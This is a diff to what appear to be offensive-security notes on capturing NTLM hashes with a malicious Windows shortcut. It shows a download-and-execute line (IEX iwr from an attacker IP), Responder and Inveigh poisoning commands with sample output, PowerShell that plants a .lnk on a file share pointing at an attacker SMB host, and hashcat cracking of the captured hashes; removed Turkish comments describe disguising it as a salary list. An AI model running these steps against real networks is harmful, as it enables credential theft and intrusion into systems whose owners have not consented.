@@ -27,15 +27,25 @@ IEX (iwr 'http://10.10.10.205/procmon.ps1')
 # Capturing Hashes with a Malicious .lnk File
 ```powershell
 sudo responder -I eth0 -dwv
+Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -Inspect Y
 
+For Example:
+[+] [2026-05-27T06:33:02] LLMNR request for GS-SVCSCAN received from 10.129.205.45 [inspect only]
+[+] [2026-05-27T06:33:10] LLMNR request for GS-SVCSCAN received from 10.129.205.45 [inspect only]
+
+PS C:\Tools> net share
+Share name   Resource                        Remark
+-------------------------------------------------------------------------------
+C$           C:\                             Default share
+IPC$                                         Remote IPC
+ADMIN$       C:\Windows                      Remote Admin
+Department Shares  C:\Department Shares
+
+GS-SVCSCAN.lnk:
 $objShell = New-Object -ComObject WScript.Shell
-# Ortak klasörün içinde "Maas_Listesi.lnk" adında bir kısayol tanımlanıyor
-$lnk = $objShell.CreateShortcut("\\Sirket-Ortak\Dokumanlar\Maas_Listesi.lnk")
-# HEDEF NOKTASI: Windows simgeyi yüklemek için bu adrese gitmeye zorlanacak
-$lnk.TargetPath = "\\10.10.10.205\share\icon.png"
-# Şüphe çekmemesi için standart bir Windows klasör ikonu atanıyor
+$lnk = $objShell.CreateShortcut("C:\Department Shares\GS-SVCSCAN.lnk")
+$lnk.TargetPath = "\\172.16.20.45\share\icon.png"
 $lnk.IconLocation = "%windir%\system32\shell32.dll, 4"
-# Değişiklikler kaydediliyor ve dosya diske yazılıyor
 $lnk.Save()
 
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
